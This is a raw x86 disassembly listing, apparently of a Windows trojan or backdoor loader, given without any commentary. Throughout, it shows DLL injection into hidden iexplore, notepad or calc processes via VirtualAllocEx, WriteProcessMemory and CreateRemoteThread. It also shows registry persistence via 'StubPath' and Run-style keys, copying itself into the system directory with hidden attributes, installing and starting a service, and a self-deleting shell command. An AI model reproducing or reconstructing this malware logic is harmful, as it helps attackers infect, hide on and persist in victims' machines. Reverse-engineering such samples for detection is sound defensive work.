push    ebx
mov     ebx, [esp+4+lpbuffer]
push    esi
push    edi
test    ebx, ebx
jz      loc_4010b2
mov     al, [esp+0ch+arg_4]
test    al, al
jnz     short loc_401025
push    104h
push    ebx
call    ds:getsystemwindowsdirectorya
jmp     short loc_401075
cmp     al, 1
jnz     short loc_401037
push    104h
push    ebx
call    ds:getsystemdirectorya
jmp     short loc_401075
cmp     al, 2
jnz     short loc_401075
push    104h
push    ebx
call    ds:getsystemdirectorya
mov     edi, offset aprogramfilesin
or      ecx, 0ffffffffh
xor     eax, eax
mov     byte ptr [ebx+3], 0
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, ebx
or      ecx, 0ffffffffh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
mov     edi, ebx
or      ecx, 0ffffffffh
xor     eax, eax
repne scasb
not     ecx
dec     ecx
cmp     byte ptr [ecx+ebx-1], 5ch
jz      short loc_4010b2
mov     edi, offset asc_4042cc
or      ecx, 0ffffffffh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, ebx
or      ecx, 0ffffffffh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
pop     edi
pop     esi
pop     ebx
retn
push    ebx
mov     ebx, [esp+4+lpbuffer]
push    esi
push    edi
test    ebx, ebx
jz      short loc_401140
mov     ecx, 41h
xor     eax, eax
mov     edi, ebx
rep stosd
mov     al, byte_404125
test    al, al
jnz     short loc_4010f1
push    2
push    ebx
call    sub_401000
add     esp, 8
mov     edi, offset aiexploreexe
jmp     short loc_40111b
cmp     al, 1
jnz     short loc_401107
push    0
push    ebx
call    sub_401000
add     esp, 8
mov     edi, offset anotepadexe
jmp     short loc_40111b
cmp     al, 2
jnz     short loc_401140
push    1
push    ebx
call    sub_401000
add     esp, 8
mov     edi, offset acalcexe
or      ecx, 0ffffffffh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, ebx
or      ecx, 0ffffffffh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
pop     edi
pop     esi
pop     ebx
retn
sub     esp, 158h
push    ebx
push    esi
lea     eax, [esp+160h+commandline]
push    edi
push    eax
call    sub_4010c0
add     esp, 4
lea     ecx, [esp+164h+startupinfo]
push    ecx
call    ds:getstartupinfoa
lea     edx, [esp+164h+processinformation]
lea     eax, [esp+164h+startupinfo]
push    edx
push    eax
push    0
push    0
push    0
push    1
push    0
lea     ecx, [esp+180h+commandline]
push    0
push    ecx
push    0
mov     [esp+18ch+startupinfo.wshowwindow], 0
mov     [esp+18ch+startupinfo.dwflags], 101h
call    ds:createprocessa
test    eax, eax
jnz     short loc_4011b1
pop     edi
pop     esi
pop     ebx
add     esp, 158h
retn
mov     edi, [esp+164h+lpstring]
mov     ebx, ds:lstrlena
push    4
push    1000h
push    edi
call    ebx
mov     edx, [esp+16ch+processinformation.hprocess]
inc     eax
push    eax
push    0
push    edx
call    ds:virtualallocex
mov     esi, eax
test    esi, esi
jnz     short loc_4011e7
pop     edi
pop     esi
pop     ebx
add     esp, 158h
retn
push    0
push    edi
call    ebx
inc     eax
push    eax
mov     eax, [esp+16ch+processinformation.hprocess]
push    edi
push    esi
push    eax
call    ds:writeprocessmemory
test    eax, eax
jnz     short loc_401209
pop     edi
pop     esi
pop     ebx
add     esp, 158h
retn
push    offset procname
push    offset modulename
call    ds:getmodulehandlea
push    eax
call    ds:getprocaddress
test    eax, eax
jnz     short loc_40122e
pop     edi
pop     esi
pop     ebx
add     esp, 158h
retn
mov     ecx, [esp+164h+processinformation.hprocess]
push    0
push    0
push    esi
push    eax
push    0
push    0
push    ecx
call    ds:createremotethread
neg     eax
sbb     eax, eax
pop     edi
pop     esi
pop     ebx
neg     eax
add     esp, 158h
retn
push    0ffffffffh
push    offset seh_401260
mov     eax, large fs:0
push    eax
mov     large fs:0, esp
sub     esp, 90h
push    esi
push    edi
push    offset asystemrootsyst
lea     ecx, [esp+0a8h+var_98]
call    ??0cstring@@qae@pbd@z
lea     eax, [esp+0a4h+var_98]
push    offset astormserverdll
lea     ecx, [esp+0a8h+var_90]
push    eax
push    ecx
mov     [esp+0b0h+var_4], 0
call    ??h@yg?avcstring@@abv0@pbd@z
push    offset dword_4044f0
lea     edx, [esp+0a8h+var_94]
push    eax
push    edx
mov     byte ptr [esp+0b0h+var_4], 1
call    ??h@yg?avcstring@@abv0@pbd@z
mov     eax, [eax]
or      ecx, 0ffffffffh
mov     edi, eax
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
lea     edx, [esp+0a4h+data]
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
lea     ecx, [esp+0a4h+var_94]
call    ??1cstring@@qae@xz
lea     ecx, [esp+0a4h+var_90]
mov     byte ptr [esp+0a4h+var_4], 0
call    ??1cstring@@qae@xz
lea     ecx, [esp+0a4h+phkresult]
push    ecx
push    offset subkey
push    80000002h
call    ds:regopenkeya
mov     edx, [esp+0a4h+phkresult]
push    offset valuename
push    edx
call    ds:regdeletevaluea
mov     ecx, [esp+0a4h+phkresult]
lea     eax, [esp+0a4h+data]
push    80h
push    eax
push    2
push    0
push    offset valuename
push    ecx
call    ds:regsetvalueexa
mov     edx, [esp+0a4h+phkresult]
push    edx
call    ds:regclosekey
push    32h
call    ds:sleep
lea     ecx, [esp+0a4h+var_98]
mov     [esp+0a4h+var_4], 0ffffffffh
call    ??1cstring@@qae@xz
mov     ecx, [esp+0a4h+var_c]
pop     edi
pop     esi
mov     large fs:0, ecx
add     esp, 9ch
retn
sub     esp, 360h
lea     eax, [esp+360h+filename]
push    ebx
push    ebp
push    esi
push    edi
push    104h
xor     ebx, ebx
push    eax
push    ebx
call    ds:getmodulefilenamea
test    eax, eax
jz      loc_4014fd
lea     ecx, [esp+370h+filename]
push    104h
lea     edx, [esp+374h+filename]
push    ecx
push    edx
call    ds:getshortpathnamea
test    eax, eax
jz      loc_4014fd
lea     eax, [esp+370h+buffer]
push    104h
push    eax
push    offset name
call    ds:getenvironmentvariablea
test    eax, eax
jz      loc_4014fd
lea     ecx, [esp+370h+string1]
push    offset string2
push    ecx
call    ds:lstrcpya
mov     esi, ds:lstrcata
lea     edx, [esp+370h+filename]
lea     eax, [esp+370h+string1]
push    edx
push    eax
call    esi
lea     ecx, [esp+370h+string1]
push    offset anul
push    ecx
call    esi
lea     edx, [esp+370h+string1]
lea     eax, [esp+370h+buffer]
push    edx
push    eax
call    esi
mov     ecx, 10h
xor     eax, eax
lea     edi, [esp+370h+startupinfo.lpreserved]
mov     [esp+370h+processinformation.hprocess], ebx
rep stosd
xor     ecx, ecx
mov     [esp+370h+startupinfo.wshowwindow], bx
mov     ebx, ds:getcurrentprocess
mov     [esp+370h+processinformation.hthread], ecx
mov     [esp+370h+processinformation.dwprocessid], ecx
push    100h
mov     [esp+374h+processinformation.dwthreadid], ecx
mov     [esp+374h+startupinfo.cb], 44h
mov     [esp+374h+startupinfo.dwflags], 1
call    ebx
mov     esi, ds:setpriorityclass
push    eax
call    esi
mov     ebp, ds:getcurrentthread
push    0fh
call    ebp
mov     edi, ds:setthreadpriority
push    eax
call    edi
lea     edx, [esp+370h+processinformation]
lea     eax, [esp+370h+startupinfo]
push    edx
push    eax
push    0
push    0
push    0ch
push    0
push    0
lea     ecx, [esp+38ch+buffer]
push    0
push    ecx
push    0
call    ds:createprocessa
test    eax, eax
jz      short loc_4014ef
mov     edx, [esp+370h+processinformation.hprocess]
push    40h
push    edx
call    esi
mov     eax, [esp+370h+processinformation.hthread]
push    0fffffff1h
push    eax
call    edi
mov     ecx, [esp+370h+processinformation.hthread]
push    ecx
call    ds:resumethread
pop     edi
pop     esi
pop     ebp
mov     eax, 1
pop     ebx
add     esp, 360h
retn
push    20h
call    ebx
push    eax
call    esi
push    0
call    ebp
push    eax
call    edi
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
add     esp, 360h
retn
push    0ffffffffh
push    offset seh_401510
mov     eax, large fs:0
push    eax
mov     large fs:0, esp
sub     esp, 214h
push    ebx
push    ebp
push    esi
push    edi
push    offset handlerproc
push    offset servicename
call    ds:registerservicectrlhandlera
mov     ebp, ds:setservicestatus
xor     ebx, ebx
push    offset servicestatus
push    eax
mov     hservicestatus, eax
mov     servicestatus.dwservicetype, 20h
mov     servicestatus.dwcontrolsaccepted, 7
mov     servicestatus.dwwin32exitcode, ebx
mov     servicestatus.dwwaithint, 7d0h
mov     servicestatus.dwcheckpoint, 1
mov     servicestatus.dwcurrentstate, 2
call    ebp
push    1f4h
mov     servicestatus.dwcheckpoint, ebx
call    ds:sleep
mov     eax, hservicestatus
push    offset servicestatus
push    eax
mov     servicestatus.dwcurrentstate, 4
call    ebp
mov     cl, byte_404124
lea     edx, [esp+230h+buffer]
push    ecx
push    edx
call    sub_401000
mov     edi, offset astormserverdll
or      ecx, 0ffffffffh
xor     eax, eax
lea     edx, [esp+238h+buffer]
repne scasb
not     ecx
sub     edi, ecx
add     esp, 4
mov     esi, edi
mov     edi, edx
mov     edx, ecx
or      ecx, 0ffffffffh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
mov     [esp+234h+var_218], esp
and     ecx, 3
rep movsb
mov     ecx, esp
push    offset adll
call    ??0cstring@@qae@pbd@z
push    65h
push    ecx
lea     eax, [esp+23ch+buffer]
mov     ecx, esp
mov     [esp+23ch+var_21c], esp
push    eax
mov     [esp+240h+var_4], ebx
call    ??0cstring@@qae@pbd@z
or      esi, 0ffffffffh
mov     [esp+23ch+var_4], esi
call    sub_402460
add     esp, 0ch
cmp     al, bl
jz      loc_4016d4
mov     cl, byte_404124
lea     edx, [esp+230h+var_110]
push    ecx
push    edx
call    sub_401000
add     esp, 8
lea     eax, [esp+230h+var_110]
lea     ecx, [esp+230h+lpstring]
push    eax
call    ??0cstring@@qae@pbd@z
mov     edi, 1
push    offset astormserverdll
lea     ecx, [esp+234h+lpstring]
mov     [esp+234h+var_4], edi
call    ??ycstring@@qaeabv0@pbd@z
mov     ecx, [esp+230h+lpstring]
push    ecx
call    sub_401150
add     esp, 4
test    eax, eax
jz      short loc_4016c4
mov     edx, hservicestatus
push    offset servicestatus
push    edx
mov     servicestatus.dwcheckpoint, edi
mov     servicestatus.dwcurrentstate, 3
call    ebp
mov     eax, hservicestatus
push    offset servicestatus
push    eax
mov     servicestatus.dwcheckpoint, ebx
mov     servicestatus.dwcurrentstate, edi
call    ebp
lea     ecx, [esp+230h+lpstring]
mov     [esp+230h+var_4], esi
call    ??1cstring@@qae@xz
mov     ecx, [esp+230h+var_c]
pop     edi
pop     esi
pop     ebp
mov     large fs:0, ecx
pop     ebx
add     esp, 220h
retn
mov     eax, [esp+dwcontrol]
push    esi
mov     esi, ds:setservicestatus
dec     eax
cmp     eax, 4
ja      def_401705
jmp     ds:jpt_401705[eax*4]
mov     ecx, hservicestatus
push    offset servicestatus
mov     servicestatus.dwcheckpoint, 1
mov     servicestatus.dwcurrentstate, 3
push    ecx
jmp     short loc_40174e
mov     edx, hservicestatus
push    offset servicestatus
mov     servicestatus.dwcheckpoint, 1
mov     servicestatus.dwcurrentstate, 3
push    edx
call    esi
push    1f4h
call    ds:sleep
mov     edx, hservicestatus
push    offset servicestatus
push    edx
mov     servicestatus.dwcheckpoint, 0
mov     servicestatus.dwcurrentstate, 1
call    esi
pop     esi
retn    4
mov     eax, hservicestatus
push    offset servicestatus
push    eax
mov     servicestatus.dwcheckpoint, 1
mov     servicestatus.dwcurrentstate, 6
call    esi
push    1f4h
call    ds:sleep
mov     edx, hservicestatus
push    offset servicestatus
push    edx
mov     servicestatus.dwcheckpoint, 0
mov     servicestatus.dwcurrentstate, 7
call    esi
pop     esi
retn    4
mov     ecx, hservicestatus
push    offset servicestatus
push    ecx
mov     servicestatus.dwcheckpoint, 1
mov     servicestatus.dwcurrentstate, 5
call    esi
push    1f4h
call    ds:sleep
mov     servicestatus.dwcheckpoint, 0
mov     servicestatus.dwcurrentstate, 4
mov     edx, hservicestatus
push    offset servicestatus
push    edx
call    esi
pop     esi
retn    4
sub     esp, 14h
push    0
call    ds:coinitialize
lea     eax, [esp+14h+pguid]
push    eax
call    ds:cocreateguid
test    eax, eax
jnz     loc_4018e3
mov     ecx, dword ptr [esp+14h+pguid.data4+7]
mov     edx, [esp+0eh]
mov     eax, [esp+0dh]
and     ecx, 0ffh
push    ecx
mov     ecx, [esp+10h]
and     edx, 0ffh
and     eax, 0ffh
push    edx
mov     edx, dword ptr [esp+1ch+pguid.data4+3]
and     ecx, 0ffh
push    eax
mov     eax, [esp+16h]
push    ecx
mov     ecx, [esp+19h]
and     edx, 0ffh
and     eax, 0ffh
push    edx
mov     edx, [esp+1ch]
and     ecx, 0ffh
push    eax
mov     eax, dword ptr [esp+2ch+pguid.data3]
push    ecx
mov     ecx, [esp+20h]
and     edx, 0ffh
and     eax, 0ffffh
push    edx
mov     edx, [esp+34h+pguid.data1]
and     ecx, 0ffffh
push    eax
push    ecx
push    edx
push    offset format
push    40h
push    offset buffer
call    ds:_snprintf
add     esp, 38h
call    ds:couninitialize
mov     eax, offset buffer
add     esp, 14h
retn
sub     esp, 368h
push    ebx
push    ebp
push    esi
push    edi
call    sub_401840
mov     ebx, eax
mov     ecx, 41h
xor     eax, eax
lea     edi, [esp+378h+subkey]
rep stosd
mov     ecx, 41h
lea     edi, [esp+378h+string]
rep stosd
mov     ecx, 41h
lea     edi, [esp+378h+filename]
rep stosd
mov     al, byte_404124
lea     ecx, [esp+378h+string]
push    eax
push    ecx
mov     [esp+380h+var_368], ebx
call    sub_401000
mov     edi, ebx
or      ecx, 0ffffffffh
xor     eax, eax
add     esp, 8
repne scasb
not     ecx
sub     edi, ecx
lea     edx, [esp+378h+string]
mov     esi, edi
mov     ebp, ecx
mov     edi, edx
or      ecx, 0ffffffffh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
lea     edx, [esp+378h+string]
and     ecx, 3
push    104h
rep movsb
mov     edi, offset substr
or      ecx, 0ffffffffh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebp, ecx
mov     edi, edx
or      ecx, 0ffffffffh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
lea     eax, [esp+37ch+filename]
and     ecx, 3
push    eax
rep movsb
push    0
call    ds:getmodulefilenamea
mov     edi, offset asoftwaremicros
or      ecx, 0ffffffffh
xor     eax, eax
lea     edx, [esp+378h+subkey]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
lea     edx, [esp+378h+subkey]
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
mov     edi, ebx
or      ecx, 0ffffffffh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebx, ecx
mov     edi, edx
or      ecx, 0ffffffffh
repne scasb
mov     ecx, ebx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebx
lea     eax, [esp+378h+phkresult]
and     ecx, 3
push    eax
rep movsb
lea     ecx, [esp+37ch+subkey]
push    ecx
push    80000002h
call    ds:regcreatekeya
lea     edx, [esp+378h+string]
push    edx
call    ds:lstrlena
mov     ecx, [esp+378h+phkresult]
push    eax
lea     eax, [esp+37ch+string]
push    eax
push    2
push    0
push    offset astubpath
push    ecx
call    ds:regsetvalueexa
mov     edx, [esp+378h+phkresult]
push    edx
call    ds:regclosekey
lea     eax, [esp+378h+filename]
push    offset mode
push    eax
call    ds:fopen
mov     edi, ds:fseek
mov     esi, eax
push    2
push    0
push    esi
call    edi
push    esi
call    ds:ftell
push    0
push    0
push    esi
mov     ebp, eax
call    edi
push    ebp
call    ds:malloc
mov     ecx, ebp
mov     ebx, eax
mov     edx, ecx
xor     eax, eax
mov     edi, ebx
push    esi
shr     ecx, 2
rep stosd
mov     ecx, edx
push    1
and     ecx, 3
push    ebp
rep stosb
push    ebx
call    ds:fread
push    esi
call    ds:fclose
mov     edi, [esp+3b4h+var_368]
lea     edx, [ebx+3058h]
or      ecx, 0ffffffffh
mov     dword ptr [ebx+6a0h], 4
lea     esi, [edx+20h]
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     [esp+3b4h+var_368], esi
mov     eax, ecx
mov     esi, edi
mov     edi, [esp+3b4h+var_368]
push    offset awb
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     ecx, 8
mov     edi, edx
rep stosd
lea     ecx, [esp+3b8h+string]
mov     byte ptr [edx], 4
push    ecx
call    ds:fopen
add     esp, 44h
mov     esi, eax
mov     edi, 1
push    esi
push    edi
push    ebp
push    ebx
call    ds:fwrite
push    esi
call    ds:fclose
push    ebx
call    ds:free
add     esp, 18h
lea     edx, [esp+378h+processinformation]
lea     ecx, [esp+378h+startupinfo]
xor     eax, eax
push    edx
push    ecx
push    eax
push    eax
push    eax
push    eax
push    eax
lea     edx, [esp+394h+string]
push    eax
push    edx
push    eax
mov     [esp+3a0h+startupinfo.cb], 44h
mov     [esp+3a0h+startupinfo.lpdesktop], eax
mov     [esp+3a0h+startupinfo.lpreserved], eax
mov     [esp+3a0h+startupinfo.lptitle], eax
mov     [esp+3a0h+startupinfo.dwflags], edi
mov     [esp+3a0h+startupinfo.cbreserved2], ax
mov     [esp+3a0h+startupinfo.lpreserved2], eax
mov     [esp+3a0h+startupinfo.wshowwindow], di
call    ds:createprocessa
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 368h
retn
push    0ffffffffh
push    offset seh_401b90
mov     eax, large fs:0
push    eax
mov     large fs:0, esp
sub     esp, 214h
mov     al, byte_404124
push    ebp
push    esi
push    edi
lea     ecx, [esp+22ch+buffer]
push    eax
push    ecx
call    sub_401000
mov     edi, offset astormserverdll
or      ecx, 0ffffffffh
xor     eax, eax
lea     edx, [esp+234h+buffer]
repne scasb
not     ecx
sub     edi, ecx
add     esp, 4
mov     esi, edi
mov     ebp, ecx
mov     edi, edx
or      ecx, 0ffffffffh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
mov     [esp+230h+var_218], esp
and     ecx, 3
rep movsb
mov     ecx, esp
push    offset adll
call    ??0cstring@@qae@pbd@z
push    65h
push    ecx
lea     eax, [esp+238h+buffer]
mov     ecx, esp
mov     [esp+238h+var_21c], esp
push    eax
mov     [esp+23ch+var_4], 0
call    ??0cstring@@qae@pbd@z
mov     [esp+238h+var_4], 0ffffffffh
call    sub_402460
add     esp, 0ch
test    al, al
jz      short loc_401c98
mov     cl, byte_404124
lea     edx, [esp+22ch+var_110]
push    ecx
push    edx
call    sub_401000
add     esp, 8
lea     eax, [esp+22ch+var_110]
lea     ecx, [esp+22ch+lpstring]
push    eax
call    ??0cstring@@qae@pbd@z
push    offset astormserverdll
lea     ecx, [esp+230h+lpstring]
mov     [esp+230h+var_4], 1
call    ??ycstring@@qaeabv0@pbd@z
mov     ecx, [esp+22ch+lpstring]
push    ecx
call    sub_401150
add     esp, 4
lea     ecx, [esp+22ch+lpstring]
test    eax, eax
mov     [esp+22ch+var_4], 0ffffffffh
call    ??1cstring@@qae@xz
mov     ecx, [esp+22ch+var_c]
pop     edi
pop     esi
mov     large fs:0, ecx
pop     ebp
add     esp, 220h
retn
sub     esp, 330h
push    ebp
push    esi
mov     esi, ds:messageboxa
push    edi
push    0
push    offset caption
push    offset caption
push    0
call    esi
mov     eax, dword_404120
cmp     eax, 1
jnz     loc_401efe
mov     ecx, 40h
xor     eax, eax
lea     edi, [esp+33ch+var_30b]
mov     [esp+33ch+data], 0
rep stosd
stosw
stosb
lea     eax, [esp+33ch+phkresult]
push    eax
push    0f003fh
push    0
push    offset subkey
push    80000002h
call    ds:regopenkeyexa
test    eax, eax
jnz     short loc_401d46
lea     ecx, [esp+33ch+cbdata]
lea     edx, [esp+33ch+data]
push    ecx
mov     ecx, [esp+340h+phkresult]
lea     eax, [esp+340h+type]
push    edx
push    eax
push    0
push    offset valuename
push    ecx
mov     [esp+354h+cbdata], 0c8h
call    ds:regqueryvalueexa
mov     edx, [esp+33ch+phkresult]
push    edx
call    ds:regclosekey
push    offset asystemrootsyst
lea     ecx, [esp+340h+var_32c]
call    ??0cstring@@qae@pbd@z
lea     eax, [esp+33ch+var_32c]
push    offset astormserverdll
lea     ecx, [esp+340h+cbdata]
push    eax
push    ecx
call    ??h@yg?avcstring@@abv0@pbd@z
mov     esi, [eax]
lea     ecx, [esp+33ch+data]
mov     dl, [ecx]
mov     al, dl
cmp     dl, [esi]
jnz     short loc_401d92
test    al, al
jz      short loc_401d8e
mov     dl, [ecx+1]
mov     al, dl
cmp     dl, [esi+1]
jnz     short loc_401d92
add     ecx, 2
add     esi, 2
test    al, al
jnz     short loc_401d6e
xor     esi, esi
jmp     short loc_401d97
sbb     esi, esi
sbb     esi, 0ffffffffh
lea     ecx, [esp+33ch+cbdata]
call    ??1cstring@@qae@xz
test    esi, esi
jnz     short loc_401dab
push    esi
call    ds:exit
mov     ebp, ds:getsystemdirectorya
lea     eax, [esp+33ch+buffer]
push    104h
push    eax
call    ebp
mov     edi, offset asc_4042cc
or      ecx, 0ffffffffh
xor     eax, eax
lea     edx, [esp+33ch+buffer]
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edi, edx
mov     edx, ecx
or      ecx, 0ffffffffh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
lea     edx, [esp+33ch+buffer]
and     ecx, 3
rep movsb
mov     edi, offset astormserverdll
or      ecx, 0ffffffffh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edi, edx
mov     edx, ecx
or      ecx, 0ffffffffh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
push    ecx
mov     ecx, esp
mov     [esp+340h+type], esp
push    offset adll
call    ??0cstring@@qae@pbd@z
push    65h
push    ecx
lea     eax, [esp+348h+buffer]
mov     ecx, esp
mov     [esp+348h+type], esp
push    eax
call    ??0cstring@@qae@pbd@z
call    sub_402460
add     esp, 0ch
test    al, al
jnz     short loc_401e6a
lea     ecx, [esp+33ch+var_32c]
call    ??1cstring@@qae@xz
xor     eax, eax
pop     edi
pop     esi
pop     ebp
add     esp, 330h
retn    10h
call    sub_401260
lea     ecx, [esp+33ch+var_104]
push    104h
push    ecx
call    ebp
lea     edx, [esp+33ch+var_104]
lea     ecx, [esp+33ch+lpstring]
push    edx
call    ??0cstring@@qae@pbd@z
push    offset asc_4042cc
lea     ecx, [esp+340h+lpstring]
call    ??ycstring@@qaeabv0@pbd@z
push    offset astormserverdll
lea     ecx, [esp+340h+lpstring]
call    ??ycstring@@qaeabv0@pbd@z
mov     eax, [esp+33ch+lpstring]
push    eax
call    sub_401150
add     esp, 4
test    eax, eax
jnz     short loc_401edc
lea     ecx, [esp+33ch+lpstring]
call    ??1cstring@@qae@xz
lea     ecx, [esp+33ch+var_32c]
call    ??1cstring@@qae@xz
xor     eax, eax
pop     edi
pop     esi
pop     ebp
add     esp, 330h
retn    10h
call    sub_401390
lea     ecx, [esp+33ch+lpstring]
call    ??1cstring@@qae@xz
lea     ecx, [esp+33ch+var_32c]
call    ??1cstring@@qae@xz
mov     eax, dword_404120
mov     esi, ds:messageboxa
cmp     eax, 2
jnz     short loc_401f75
call    sub_402320
test    eax, eax
jz      short loc_401f48
lea     ecx, [esp+33ch+servicestarttable]
mov     [esp+33ch+servicestarttable.lpservicename], offset servicename
push    ecx
mov     [esp+340h+servicestarttable.lpserviceproc], offset sub_401510
mov     [esp+340h+var_314], 0
mov     [esp+340h+var_310], 0
call    ds:startservicectrldispatchera
mov     eax, 1
pop     edi
pop     esi
pop     ebp
add     esp, 330h
retn    10h
push    offset string
push    offset displayname
push    offset servicename
call    sub_401fd0
mov     eax, dword_4044ac
add     esp, 0ch
test    eax, eax
jz      short loc_401fbf
call    sub_401390
push    0
call    ds:exit
cmp     eax, 3
jnz     short loc_401fa5
push    0
push    offset text
push    offset text
push    0
call    esi
call    sub_401900
call    sub_401390
mov     eax, 1
pop     edi
pop     esi
pop     ebp
add     esp, 330h
retn    10h
cmp     eax, 4
jnz     short loc_401fbf
push    0
push    offset text
push    offset text
push    0
call    esi
call    sub_401b90
pop     edi
pop     esi
mov     eax, 1
pop     ebp
add     esp, 330h
retn    10h
push    ebp
mov     ebp, esp
push    0ffffffffh
push    offset stru_403188
push    offset _except_handler3
mov     eax, large fs:0
push    eax
mov     large fs:0, esp
sub     esp, 370h
push    ebx
push    esi
push    edi
push    104h
lea     eax, [ebp+filename]
push    eax
xor     ebx, ebx
push    ebx
call    ds:getmodulefilenamea
mov     cl, byte_404124
push    ecx
lea     edx, [ebp+str1]
push    edx
call    sub_401000
lea     edi, [ebp+str1]
or      ecx, 0ffffffffh
xor     eax, eax
repne scasb
not     ecx
dec     ecx
push    ecx
lea     eax, [ebp+filename]
push    eax
lea     ecx, [ebp+str1]
push    ecx
call    ds:strncmp
add     esp, 14h
test    eax, eax
jz      loc_402178
push    50h
lea     edx, [ebp+buf]
push    edx
lea     eax, [ebp+filename]
push    eax
call    ds:getfiletitlea
push    offset substr
lea     ecx, [ebp+buf]
push    ecx
mov     esi, ds:strstr
call    esi
add     esp, 8
test    eax, eax
jnz     short loc_4020c2
push    offset aexe_0
lea     edx, [ebp+buf]
push    edx
call    esi
add     esp, 8
test    eax, eax
jnz     short loc_4020c2
lea     edx, [ebp+buf]
mov     edi, offset substr
or      ecx, 0ffffffffh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebx, ecx
mov     edi, edx
or      ecx, 0ffffffffh
repne scasb
dec     edi
mov     ecx, ebx
shr     ecx, 2
rep movsd
mov     ecx, ebx
and     ecx, 3
rep movsb
lea     edx, [ebp+str1]
mov     edi, offset asc_4042cc
or      ecx, 0ffffffffh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebx, ecx
mov     edi, edx
or      ecx, 0ffffffffh
repne scasb
dec     edi
mov     ecx, ebx
shr     ecx, 2
rep movsd
mov     ecx, ebx
and     ecx, 3
rep movsb
lea     edi, [ebp+buf]
lea     edx, [ebp+str1]
or      ecx, 0ffffffffh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebx, ecx
mov     edi, edx
or      ecx, 0ffffffffh
repne scasb
dec     edi
mov     ecx, ebx
shr     ecx, 2
rep movsd
mov     ecx, ebx
and     ecx, 3
rep movsb
push    eax
lea     eax, [ebp+str1]
push    eax
lea     ecx, [ebp+filename]
push    ecx
call    ds:copyfilea
mov     ecx, 41h
xor     eax, eax
lea     edi, [ebp+filename]
rep stosd
lea     edi, [ebp+str1]
lea     edx, [ebp+filename]
or      ecx, 0ffffffffh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
mov     dword_4044ac, 1
xor     ebx, ebx
push    6
lea     ecx, [ebp+filename]
push    ecx
call    ds:setfileattributesa
mov     [ebp+phkresult], ebx
mov     [ebp+var_330], ebx
mov     [ebp+var_32c], ebx
mov     [ebp+ms_exc.registration.trylevel], ebx
push    0f003fh
push    ebx
push    ebx
call    ds:openscmanagera
mov     esi, eax
mov     [ebp+var_32c], esi
test    esi, esi
jz      loc_4022cf
push    0
push    0
push    0
push    0
push    0
lea     edx, [ebp+filename]
push    edx
push    0
push    2
push    10h
push    0f01ffh
mov     eax, [ebp+lpdisplayname]
push    eax
mov     edi, [ebp+lpservicename]
push    edi
push    esi
call    ds:createservicea
mov     ebx, eax
mov     [ebp+var_330], ebx
test    ebx, ebx
jnz     short loc_402225
call    ds:getlasterror
cmp     eax, 431h
jnz     short loc_402225
push    0f01ffh
push    edi
push    esi
call    ds:openservicea
mov     ebx, eax
mov     [ebp+var_330], ebx
test    ebx, ebx
jz      loc_4022cf
push    0
push    0
push    ebx
call    ds:startservicea
push    0
push    0
push    ebx
call    ds:startservicea
test    eax, eax
jz      loc_4022cf
lea     edx, [ebp+subkey]
mov     edi, offset asystemcurrentc_0
or      ecx, 0ffffffffh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
lea     edx, [ebp+subkey]
mov     edi, [ebp+lpservicename]
or      ecx, 0ffffffffh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edi, edx
mov     edx, ecx
or      ecx, 0ffffffffh
repne scasb
dec     edi
mov     ecx, edx
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
lea     eax, [ebp+phkresult]
push    eax
lea     ecx, [ebp+subkey]
push    ecx
push    80000002h
call    ds:regopenkeya
mov     esi, [ebp+lpstring]
push    esi
call    ds:lstrlena
push    eax
push    esi
push    1
push    0
push    offset adescription
mov     edx, [ebp+phkresult]
push    edx
call    ds:regsetvalueexa
mov     esi, [ebp+var_32c]
mov     [ebp+ms_exc.registration.trylevel], 0ffffffffh
call    loc_4022f8
mov     ecx, [ebp+ms_exc.registration.next]
